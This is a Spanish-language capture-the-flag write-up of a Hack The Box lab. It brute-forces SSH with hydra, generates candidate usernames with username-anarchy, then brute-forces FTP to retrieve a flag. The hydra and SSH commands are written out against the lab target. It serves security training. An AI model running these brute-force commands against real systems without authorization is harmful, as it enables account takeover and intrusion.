--- 
title: "Laboratorio de Login Brute Forcing 2"  
date: 2025-08-18
tags: [hackthebox, login, brute force]
categories: ["Brute Force", "Hack The Box"]
summary: "En este laboratorio vamos a hacer fuerza ruta contra ssh y ftp, además vamos a generar posibles ususarios utilizando `username-anarchy`"
draft: false 

---
![](../../../../../images/Miniaturas/login_brute_forcing_2.png)
#### Enunciado
Esta es la segunda parte de la evaluación de habilidades. `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`Usa el nombre de usuario que te dieron al completar la primera parte para forzar el inicio de sesión en la instancia de destino.


**¿Cuál es el nombre de usuario del usuario FTP que encuentras mediante fuerza bruta?**
Recordemos que obtuvimos el usuario `satwossh` en la primera parte del laboratorio.
Trabajamos con la wordlist que nos dieron en el ejercicio anterior que es la misma que `seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt`

```bash
hydra -l satwossh -P passwds.txt ssh://94.237.61.242 -s 42019
```

![](../../../../../images/HTB_modulos/Login_Brute_Force_htb_lab_2/flag_1-1.png)
Y obtenemos credenciales válidas.
Nos conectamos por ssh
```bash
ssh satwossh@<IP> -p<Puerto>
```
Y vemos que tenemos varios archivos en el servidor.
![](../../../../../images/HTB_modulos/Login_Brute_Force_htb_lab_2/flag_1-2.png)
Analizando nos dan un posible usuario `Thomas Smith`
Tenemos una wordlist de contraseñas y tenemos también la herramienta para generar posibles usuarios por lo que vamos a utilizarla.
Usamos `username-anarchy`:
```bash
./username-anarchy Thomas Smith > thomas_smith_usernames.txt
```
Vemos que nos genero posibles usuarios
![](../../../../../images/HTB_modulos/Login_Brute_Force_htb_lab_2/flag_1-3.png)
```bash
netstat -tulnp
```
Vemos que está escuchando por el puerto 21 y 22, vamos a hacer fuer bruta sobre el puerto 21 que es ftp por defecto.
```bash
hydra -L thomas_smith_usernames.txt -P passwords.txt ftp://127.0.0.1
```
![](../../../../../images/HTB_modulos/Login_Brute_Force_htb_lab_2/flag_1-4.png)
Así obtenemos el usuario.
**¿Cuál es la bandera contenida en flag.txt?**
Ahora con credenciales válidas nos vamos a conectar al servidor ftp.
```
ftp 127.0.0.1
```
![](../../../../../images/HTB_modulos/Login_Brute_Force_htb_lab_2/flag_2-1.png)
Nos descargamos la flag.
La leemos.
![](../../../../../images/HTB_modulos/Login_Brute_Force_htb_lab_2/flag_2-2.png)

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.